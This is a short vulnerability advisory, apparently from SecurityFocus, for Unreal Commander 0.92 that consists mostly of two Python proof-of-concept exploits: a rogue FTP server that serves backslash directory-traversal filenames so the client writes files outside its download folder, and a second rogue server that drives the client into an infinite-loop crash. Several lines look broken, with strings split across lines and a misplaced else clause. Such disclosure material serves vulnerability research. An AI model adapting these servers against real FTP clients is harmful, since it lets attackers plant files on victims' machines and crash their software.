source: http://www.securityfocus.com/bid/25583/info

Unreal Commander is prone to multiple remote vulnerabilities, including a directory-traversal issue and a denial-of-service issue.

An attacker can exploit these issues to compromise the affected computer, write files to arbitrary locations, and crash the affected application.

Unreal Commander 0.92 (build 565) and 0.92 (build 573) are vulnerable; prior versions may also be affected. 

== Proof of Concept - Remote FTP Directory Traversal ==
# python FTP
# by Gynvael Coldwind
import socket

TransferSock = 0

def sendDirList (sock):
  (DataSock, Address) = TransferSock.accept()
  print "sendDirList: TransferSock accepted a connection"
  sock.send("150 Opening ASCII mode data connection for file list\r\n");
  DataSock.send("-rwxr-xr-x   2 ftp      ftp          4096 Aug  1
02:28 st\\..\\..\\..\\..\\..\\..\\BackSlashPoC\n");
  DataSock.close()
  sock.send("226 Transfer complete.\r\n");
  print "sendDirList: Transfer complete\r\n"

def sendFile (sock):
  (DataSock, Address) = TransferSock.accept()
  print "sendDirList: TransferSock accepted a connection"
  sock.send("150 Opening BINARY mode data connection for sth (5 bytes)\r\n");
  DataSock.send("Proof of Concept - Remote FTP Client directory
traversal vulnerability (G.C. - Hispasec)");
  DataSock.close()
  sock.send("226 Transfer complete.\r\n");
  print "sendDirList: Transfer complete\r\n"

def handleUSER (sock, cmd, argz): sock.send("331 Password required for
user\r\n")
def handlePASS (sock, cmd, argz): sock.send("230 User logged in.\r\n")
def handleSYST (sock, cmd, argz): sock.send("215 UNIX Type: L8\r\n")
def handleFEAT (sock, cmd, argz): sock.send("211-Features:\r\n
MDTM\r\n REST STREAM\r\n211 End\r\n");
def handleTYPE (sock, cmd, argz): sock.send("200 Type set to " + argz + "\r\n");
def handlePASV (sock, cmd, argz): sock.send("227 Entering Passive Mode
(127,0,0,1,10,10)\r\n");
def handlePWD (sock, cmd, argz): sock.send("257 \"/\" is current
directory.\r\n")
def handleCWD (sock, cmd, argz): sock.send("250 Requested file action
okay, completed.\r\n")
def handleLIST (sock, cmd, argz): sendDirList(sock)
def handleQUIT (sock, cmd, argz):
  sock.send("Bye.\r\n")
  sock.close()

def handleRETR (sock, cmd, argz):
  if argz == "/":
    sendDirList(sock)
else:
    sendFile(sock)


def unknown (sock, cmd, argz): sock.send("550 " + cmd + ": Operation
not permitted\r\n")

handlers = {
    'USER': handleUSER,
    'PASS': handlePASS,
    'SYST': handleSYST,
    'FEAT': handleFEAT,
    'TYPE': handleTYPE,
    'PASV': handlePASV,
    'PWD': handlePWD,
    'CWD': handleCWD,
    'LIST': handleLIST,
    'QUIT': handleQUIT,
    'RETR': handleRETR
    }

ControlSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ControlSock.bind(("127.0.0.1", 2021))
ControlSock.listen(1)

TransferSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
TransferSock.bind(("127.0.0.1", 10 * 256 + 10))
TransferSock.listen(10)

# Control Sock loop
(ClientSock, Address) = ControlSock.accept()
ClientSock.send("220 PoCFTPD 1.2.3.4 Server ready.\r\n");
end = 0
while not end:
  cmd = ClientSock.recv(1024)
  print "Debug: recv -> " + cmd.strip()
  command = (cmd[0:4]).strip()
  argz = ((cmd.strip())[5:]).strip()
  handlers.get(command, unknown)(ClientSock, command, argz)
== Proof of Concept - Remote FTP Directory Traversal ==
# python FTP DoS
# by Gynvael Coldwind
import socket

TransferSock = 0

def handleUSER (sock, cmd, argz): sock.send("331 Password required for
user\r\n")
def handlePASS (sock, cmd, argz): sock.send("230 User logged in.\r\n")
def handleSYST (sock, cmd, argz): sock.send("215 UNIX Type: L8\r\n")
def handleFEAT (sock, cmd, argz): sock.send("211-Features:\r\n
MDTM\r\n REST STREAM\r\n211 End\r\n");
def handleTYPE (sock, cmd, argz): sock.send("200 Type set to " + argz + "\r\n");
def handlePASV (sock, cmd, argz): sock.send("227 Entering Passive Mode
(127,0,0,1,10,10)\r\n");
def handleQUIT (sock, cmd, argz):
  sock.send("Bye.\r\n")
  sock.close()

def unknown (sock, cmd, argz):
  sock.send("550 " + cmd + ": Operation not permitted\r\n")
  print "The Unreal Commander is not in an infinite loop. You may quit
this exploit, the infinite loop will last."

handlers = {
    'USER': handleUSER,
    'PASS': handlePASS,
    'SYST': handleSYST,
    'FEAT': handleFEAT,
    'TYPE': handleTYPE,
    'PASV': handlePASV,
    'QUIT': handleQUIT
    }

ControlSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ControlSock.bind(("127.0.0.1", 2021))
ControlSock.listen(1)

TransferSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
TransferSock.bind(("127.0.0.1", 10 * 256 + 10))
TransferSock.listen(10)

# Control Sock loop
(ClientSock, Address) = ControlSock.accept()
ClientSock.send("220 PoCFTPD 1.2.3.4 Server ready.\r\n");
end = 0

while not end:
  cmd = ClientSock.recv(1024)
  print "Debug: recv -> " + cmd.strip()
  command = (cmd[0:4]).strip()
  argz = ((cmd.strip())[5:]).strip()
  handlers.get(command, unknown)(ClientSock, command, argz)